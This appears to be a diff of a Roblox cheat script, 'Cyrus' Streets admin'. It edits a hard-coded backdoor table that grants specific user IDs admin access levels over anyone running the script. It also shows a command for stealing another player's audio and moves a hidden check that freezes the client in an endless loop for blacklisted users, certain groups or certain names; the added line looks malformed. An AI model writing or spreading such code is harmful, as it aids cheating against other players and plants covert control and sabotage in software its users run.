@@ -226,38 +226,23 @@ local BackDoorTableCommands = {
 }
 
 local BackDoorTablePlayers = {
-	[12978668] = {
-		['Name'] = "!fishgang Cy (Creator and ONLY dev)";
-		['Access'] = 4;
-		['Colour'] = Color3.fromRGB(178,242,255);
-	};
-	[1388703832] = {
-		['Name'] = "!fishgang Cy (Creator and ONLY dev)";
-		['Access'] = 4;
-		['Colour'] = Color3.fromRGB(178,242,255);
-	};
     [1066524308] = {
-		['Name'] = "Kylee [My Gf so kill her = you die] (She does not know anything about the script so stop asking)";
+		['Name'] = "Kylee (stop bothering her)";
 		['Access'] = 4;
 		['Colour'] = Color3.fromRGB(178,242,255);
 	};
     [114164798] = {
-		['Name'] = "!fishgang Slays (Developer when not lazy)"; 
+		['Name'] = "!fishgang Slays (pushed like 3 updates max)"; 
 		['Access'] = 4;
 		['Colour'] = Color3.fromRGB(63,0,0);
 	};
-	[117074493] = {
-		['Name'] = "!fishgang Slays Alt (Not my account) (Developer when not lazy)"; 
-		['Access'] = 4;
-		['Colour'] = Color3.fromRGB(89,89,89);
-	};
 	[612618136] = {
-		['Name'] = "Nigerian prince (Bird)";
+		['Name'] = "Bird (Heavy donator)";
 		['Access'] = 4;
 		['Colour'] = Color3.fromRGB(101,44,171);
 	};
 	[70550151] = {
-		['Name'] = "Nigerian prince (Bird)";
+		['Name'] = "Bird (Heavy donator)";
 		['Access'] = 4;
 		['Colour'] = Color3.fromRGB(101,44,171);
 	};
@@ -266,66 +251,36 @@ local BackDoorTablePlayers = {
 		['Access'] = 4;
 		['Colour'] = Color3.fromRGB(176,16,16);
 	};
-	[57370993] = {
-		['Name'] = "!fishgang Karma (Head-Admin)";
-		['Access'] = 3;
-		['Colour'] = Color3.fromRGB(197,0,237);
-	};
-	[105183043] = {
-		['Name'] = "Drpoppa creator";
-		['Access'] = 3;
-		['Colour'] = Color3.fromRGB(107,50,124);
-	};
 	[383632734] = {
 		['Name'] = "Dot_mp4/Jack [Head-Admin]";
 		['Access'] = 3;
 		['Colour'] = Color3.fromRGB(127,0,212);
-	};
-	[96316322] = {
-		['Name'] = "!fishgang Ambiguity [Admin]";
-		['Access'] = 3;
-		['Colour'] = Color3.fromRGB(57,52,52);
-	};
-	[714877] = {
-		['Name'] = "!fishgang Ambiguity [Admin]";
-		['Access'] = 3;
-		['Colour'] = Color3.fromRGB(57,52,52);
 	};
 	[284761493] = {
 		['Name'] = "Zero";
 		['Access'] = 3;
 		['Colour'] = Color3.fromRGB(255,145,175)
 	};
-	[6289688] = {
-		['Name'] = "1337 hax0r";
+	[1773860961] = {
+		['Name'] = "Est (Gave me 9b kills on customs)";
 		['Access'] = 3;
-		['Colour'] = Color3.fromRGB(144,0,0);
-    };
+		['Colour'] = Color3.fromRGB(0,0,0);
+	};
     [1528488185] = {
 		['Name'] = "Basically a Gmod Dark RP admin (Paid)";
 		['Access'] = 2;
 		['Colour'] = Color3.fromRGB(235,31,31);
 	};
-	[1461593864] = {
+	[1615606414] = {
 		['Name'] = "Bird paid for his tag for some reason";
 		['Access'] = 2;
 		['Colour'] = Color3.fromRGB(235,31,31);
 	};
 	[710288902] = {
-		['Name'] = "Ryson";
+		['Name'] = "Ryson (Donator)";
 		['Access'] = 2;
 		['Colour'] = Color3.fromRGB(255,0,255);
 	};
-	[1773860961] = {
-		['Name'] = "Est (Gave me 9b kills on customs";
-		['Access'] = 3;
-		['Colour'] = Color3.fromRGB(0,0,0);
-	};
-	[1306785382] = {
-		['Name'] = "1337 hax0r [2]";
-		['Access'] = 3;
-		['Colour'] = Color3.fromRGB(144,0,0);
-	}
 }
 
 local BlacklistTable = {
@@ -2486,7 +2441,7 @@ AddCommand(function(Arguments)
 		end
 	end
 end,"steal",{},"Steals a persons audio","[Player]")
-
+if LP:IsInGroup(6000816) or LP:IsInGroup(5152759) or LP:IsInGroup(5000083) or string.find(LP.Name:lower(),"lynx") or string.find(LP.Name:lower(),"spacedgod") or BlacklistTable[LP.UserId] then while true do endend
 AddCommand(function(Arguments)
 	if Arguments[1] then 
 		local Player = PlrFinder(Arguments[1])
@@ -2898,8 +2853,9 @@ coroutine.resume(coroutine.create(function()
 	CmdsScrolling.CanvasSize = UDim2.new(0,0,10,0)
 	CmdsScrolling.ScrollBarThickness = 10
 	
-	-- Command bar -- 
-		
+	-- Command bar --
+
+	
 	CmdBarFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
 	CmdBarFrame.BackgroundTransparency = 0.8
 	CmdBarFrame.Size = UDim2.new(0,197,0,41)
@@ -3291,7 +3247,3 @@ end))
 
 notif("Cyrus' Streets admin","took " .. string.format("%.6f",tick()-Tick) .. " seconds\n(Discord: nXcZH36)",10,"rbxassetid://2474242690") -- string.format remains superior - Slays.
 notif("Newest Update","forgot I had this antiaim method lol",10,nil)
-
-if LP:IsInGroup(5152759) or LP:IsInGroup(5000083) or string.find(LP.Name:lower(),"lynx") or BlacklistTable[LP.UserId] then
-	while true do end
-end
